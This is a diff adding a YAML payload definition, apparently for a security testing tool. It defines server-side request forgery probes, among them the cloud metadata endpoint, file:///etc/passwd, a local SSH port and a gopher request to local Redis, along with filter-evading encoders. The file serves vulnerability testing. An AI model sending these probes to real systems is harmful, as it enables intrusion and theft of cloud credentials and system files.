@@ -1,0 +1,7 @@
+schema: 'rsecopsx.payloads/v1'
+classes:
+  - id: 'ssrf'
+    cwe: 'CWE-918'
+    description: 'Server-side request forgery probes for URL-fetching sinks.'
+    payloads: ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:22', 'file:///etc/passwd', 'gopher://127.0.0.1:6379/_']
+    encoders: ['url', 'double_encode', 'null_byte']
